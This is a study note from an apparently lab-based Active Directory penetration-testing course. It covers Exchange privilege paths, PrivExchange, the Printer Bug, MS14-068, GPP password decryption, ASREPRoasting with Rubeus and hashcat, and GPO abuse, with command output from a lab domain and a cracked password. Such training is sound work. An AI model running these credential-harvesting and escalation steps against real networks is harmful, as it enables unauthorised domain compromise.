# Miscellaneous Misconfigurations

A broad understanding of AD internals helps spot the issues others miss. Grab-bag of additional attacks/misconfigurations worth knowing.

---

## Scenario Setup

Move back and forth between Windows (MS01, RDP) and Linux (`172.16.5.225` via SSH from a PowerShell console on MS01, `htb-student:HTB_@cademy_stdnt!`).

---

## Exchange-Related Group Membership

A default Exchange install (no split-admin model) grants Exchange considerable domain privileges via users/groups/ACLs.
**No split-administration**: A normal Exchange installation where Exchange is closely integrated with AD, rather than keeping Exchange and AD administration strictly separate.

> [!danger] Exchange Windows Permissions group
> Not a protected group, but members can **write a DACL to the domain object** — leverageable to grant a user **DCSync** privileges. Attackers can add accounts to this group via a DACL misconfiguration, or via a compromised **Account Operators** member. Power users/remote-office support staff are often (unnecessarily) added here for password-reset convenience. Details: [Exchange-AD-Privesc GitHub repo](https://github.com/gdedrouas/Exchange-AD-Privesc).

**Organization Management** group — effectively "Domain Admins for Exchange." Can access **all domain mailboxes**, and has full control over the `Microsoft Exchange Security Groups` OU (which contains `Exchange Windows Permissions`). Sysadmins are commonly members of this group.

> [!tip] Exchange servers are high-value targets
> Compromising an Exchange server often leads directly to Domain Admin. Dumping memory on one frequently yields dozens/hundreds of cleartext creds or NTLM hashes — users logging into **OWA** get their credentials cached in Exchange's memory.

## PrivExchange

Flaw in Exchange's **PushSubscription** feature: any domain user with a mailbox can force Exchange to authenticate to an attacker-supplied host over HTTP.

The Exchange service runs as **SYSTEM** and (pre-2019 CU) has **WriteDacl** on the domain by default. Relay this auth to **LDAP** → dump the domain's NTDS database. If LDAP relay isn't possible, relay/authenticate to other hosts instead.

> [!danger] Full impact
> Goes straight to Domain Admin using **any authenticated domain user account**.

## Printer Bug

Flaw in **MS-RPRN** (Print System Remote Protocol). Any domain user can connect to the spool's named pipe (`RpcOpenPrinter`), call `RpcRemoteFindFirstPrinterChangeNotificationEx`, and force the server to authenticate to an attacker-chosen host over **SMB**.

The spooler service runs as SYSTEM and installs by default on Windows Server with Desktop Experience. Relay the coerced auth to LDAP → grant DCSync privileges.

**Cross-domain variant:** relay LDAP auth to grant **Resource-Based Constrained Delegation (RBCD)** to a controlled computer account → authenticate as any user on the victim host. Can compromise a DC in a **partner domain/forest** if you already have admin access on a DC in the first forest and the trust permits TGT delegation (non-default now).

### Check for the Printer Bug

Tool: `Get-SpoolStatus` from `SecurityAssessment.ps1` (available on the target system, mirrored at [this repo](https://github.com/itzvenom/Security-Assessment-PS)), or [NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)  to check for machines vulnerable to the [MS-PRN Printer Bug](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability). 

```powershell
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

> [!tip] Cross-forest use case
> Especially useful for compromising a DC in another forest that has **Unconstrained Delegation** enabled, once one forest is already compromised.

## MS14-068

Kerberos protocol flaw allowing standard domain user creds to escalate to **Domain Admin**. A Kerberos ticket's **PAC** (Privilege Attribute Certificate) contains account name/ID/group membership, normally signed by the KDC to prevent tampering.

**The flaw:** a forged PAC was accepted by the KDC as legitimate — attacker fakes membership in Domain Admins (or another privileged group). Tools: [PyKEK](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or Impacket.

> [!warning] Patch-only defense
> No workaround besides patching. HTB machine [Mantis](https://app.hackthebox.com/machines/98) demonstrates this vulnerability.

## Sniffing LDAP Credentials

Apps/printers often store LDAP creds in their web admin console (often weak/default passwords, sometimes shown in cleartext). Many have a "test connection" feature — point the LDAP IP at your attack host, run a `netcat` listener on port **389**, and the device will send credentials (often cleartext) when it "tests" the connection. Accounts used for LDAP connections are often privileged, but even low-priv ones can be a foothold. Sometimes a full LDAP server is needed instead — see [this post](https://grimhacker.com/2018/03/09/just-a-printer/) for that variant.

## Enumerating DNS Records

Tool: [adidnsdump](https://github.com/dirkjanm/adidnsdump) — dumps all DNS records with just a valid domain user account.

> [!tip] Why this matters
> If host names from BloodHound/other enumeration look like `SRV01934.INLANEFREIGHT.LOCAL`, non-descriptive naming makes attack planning hard. DNS records can reveal a more descriptive alias, e.g. `JENKINS.INLANEFREIGHT.LOCAL`, pointing to the same server.

**How it works:** by default, all users can list child objects of a DNS zone in AD, but querying via LDAP doesn't return everything — `adidnsdump` resolves the full zone. Deep dive: [Getting in the Zone](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/).

### First Run — Some Records Blank

```shellsession
s0nam@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5

Password:
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

```shellsession
s0nam@htb[/htb]$ head records.csv

type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
```

`LOGISTICS` shows as `?,?` — unresolved.

```shellsession
<SNIP>
```

## PASSWD_NOTREQD Field

If   [passwd_notreqd](https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD) set in `userAccountControl`, the account is **exempt from the current password policy length** — could mean a shorter password, or even empty (if empty passwords are allowed).

> [!info] Doesn't guarantee no password
> The flag being set just means one *may* not be required — not that it *isn't* set. Common causes: intentional (avoiding after-hours password-reset calls), accidental (hitting enter early during a CLI password change), or leftover from a vendor product's install-time config.

```powershell
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                       useraccountcontrol
--------------                       ------------------
guest                                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                 ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                          PASSWD_NOTREQD, NORMAL_ACCOUNT
```

> [!tip] Worth testing (and reporting)
> Test each flagged account for a blank password — genuinely found this a couple times in real assessments. Include in the client report regardless of outcome if the assessment aims for comprehensive coverage.

## Group Policy Preferences (GPP) Passwords

When a new GPP is created, GPP creates `.xml` files in SYSVOL (also cached locally on affected endpoints), covering:
- Drive mapping (`drives.xml`)
- Local user creation
- Printer configs (`printers.xml`)
- Service creation/updates (`services.xml`)
- Scheduled tasks (`scheduledtasks.xml`)
- Local admin password changes

> [!danger] cpassword is trivially decryptable
> The `cpassword` attribute is AES-256 encrypted, but Microsoft [published the AES key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) — any domain user can read these files (SYSVOL default read access) and decrypt them.

Patched in 2014 ([MS14-025](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30)) — prevents *new* GPP passwords from being set, but doesn't remove existing `Groups.xml` files. Deleting (not unlinking) a GPO leaves the local cached copy in place too.

### Decrypt Manually

```shellsession
s0nam@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```

### Tools to locate GPP Password

[Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the GPP Metasploit post module, or CrackMapExec 2 modules.

```shellsession
s0nam@htb[/htb]$ crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
```

> [!tip] Try the password even if the account is stale
> GPP passwords often belong to legacy/deleted accounts — but password re-use is common. Try spraying with a unique GPP password internally.

### Registry.xml Autologon Credentials

A separate issue — Microsoft hasn't blocked storing autologon creds in `Registry.xml` on SYSVOL, so they're readable cleartext by any authenticated user if configured via GPO (vs. locally on the host).

We can hunt for this using CrackMapExec with the [gpp_autologin](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin) module, or using the [Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) script included in PowerSploit.

## ASREPRoasting

Obtain a TGT for any account with **" [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory)"** enabled — often set by vendor install guides for service accounts. The **AS-REP** is encrypted with the account's password, and **any domain user can request it** — no special access needed.

> [!info] How pre-auth normally works
> User enters password → encrypts a timestamp → DC decrypts to validate → issues a TGT if correct. With pre-auth **disabled**, an attacker can request auth data for the account directly and get back an **encrypted TGT** — crackable offline (Hashcat/John).

![[Pasted image 20260728221843.png]]
Similar to Kerberoasting but attacks the **AS-REP** instead of TGS-REP — **no SPN required**. Enumerable via PowerView or the AD PowerShell module. 
The attack itself can be performed with the [Rubeus](https://github.com/GhostPack/Rubeus) toolkit and other tools to obtain the ticket for the target account.
If an attacker has `GenericWrite`/`GenericAll` on an account, they can **enable** this attribute themselves, roast, then disable it again afterward. Success depends on a relatively weak password, same as Kerberoasting.

### Enumerate DONT_REQ_PREAUTH Accounts

```powershell
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

### Retrieve the AS-REP with Rubeus

```powershell
PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

[*] Action: AS-REP roasting
[*] Target User            : mmorgan
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:      $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC1304671...
```

`/nowrap` matters for clean Hashcat input, same reasoning as Kerberoasting.

### Crack with Hashcat

```shellsession
s0nam@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt

<SNIP>...:Welcome!00

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Time.Started.....: Fri Apr  1 13:18:40 2022 (14 secs)
```

> If the AS-REP can't be cracked, still report the finding — just at lower risk — so the client can review whether the setting is actually needed on that account.

## Group Policy Object (GPO) Abuse

GPOs configure hardening settings across users/computers — but a misconfigured GPO ACL can enable lateral movement, privesc, domain compromise, or persistence.

**Possible GPO-based attacks:**
- Add rights to a user (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeImpersonatePrivilege`)
- Add a local admin user to one or more hosts
- Create an immediate scheduled task for arbitrary code execution

Enumeration tools: PowerView, BloodHound, [group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/).

### List GPOs

```powershell
PS C:\htb> Get-DomainGPO |select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services
```

> [!tip] What this reveals
> Security posture at a glance — cmd.exe blocking, a separate service-account password policy, AutoLogon in use (possible readable password in a GPO), and AD CS presence.

Built-in alternative (needs [GroupPolicy cmdlets](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps) installed):

#### Enumerating GPO Names with a Built-In Cmdlet

```powershell
PS C:\htb> Get-GPO -All | Select DisplayName
```

### Check Domain Users' GPO Rights

```powershell
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl, WriteOwner
AccessMask            : 983095
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
AceType               : AccessAllowed
```

`Domain Users` has `WriteProperty` and `WriteDacl` over this GPO — enough to grant full control over it.

### Resolve GPO GUID to Name

```powershell
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
```

Confirmed via BloodHound too: `Domain Users` has `GenericWrite`, `WriteOwner`, `WriteDacl` on `Disconnect Idle RDP`. Checking **Affected Objects** in the Node Info tab shows this GPO applies to one OU containing four computer objects.

![[Pasted image 20260728223709.png]]

> [!warning] Scope matters before acting
> A tool like [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) can push a local-admin add, an immediate scheduled task, or a malicious startup script through the affected OU. **Before running anything, check exactly how many hosts the GPO applies to** — pushing to a GPO linked to 1,000 computers means affecting all 1,000. Some attack options let you scope to a specific target user/host instead. (GPO attacks get full in-depth coverage in a later module.)

## Key Takeaways

- [ ] `Exchange Windows Permissions` group → WriteDacl on the domain → path to DCSync; `Organization Management` = "Domain Admins for Exchange"
- [ ] PrivExchange: any mailbox user → coerce Exchange (SYSTEM, over-privileged pre-2019 CU) → relay to LDAP → Domain Admin
- [ ] Printer Bug (MS-RPRN): coerce SMB auth from the spooler service → relay to LDAP → DCSync, or RBCD cross-forest
- [ ] MS14-068: forged Kerberos PAC → fake Domain Admin membership — patch-only fix
- [ ] LDAP credential sniffing via app "test connection" features pointed at a netcat listener on port 389
- [ ] `adidnsdump -r` resolves hidden/unlinked DNS records that plain LDAP queries miss
- [ ] Check user Description/Notes fields and `PASSWD_NOTREQD` flag for weak/blank passwords
- [ ] SYSVOL scripts + GPP `cpassword` (decryptable via published AES key) + Registry.xml autologon = recurring credential leak sources
- [ ] ASREPRoasting: `DONT_REQ_PREAUTH` accounts leak a crackable AS-REP to **any** domain user, no special access required — `Rubeus asreproast`, `GetNPUsers.py`, or Kerbrute automatically
- [ ] GPO ACL misconfigurations (WriteDacl/GenericWrite for broad groups like Domain Users) can push local admin adds or scheduled tasks to every host the GPO applies to — check affected object count before acting
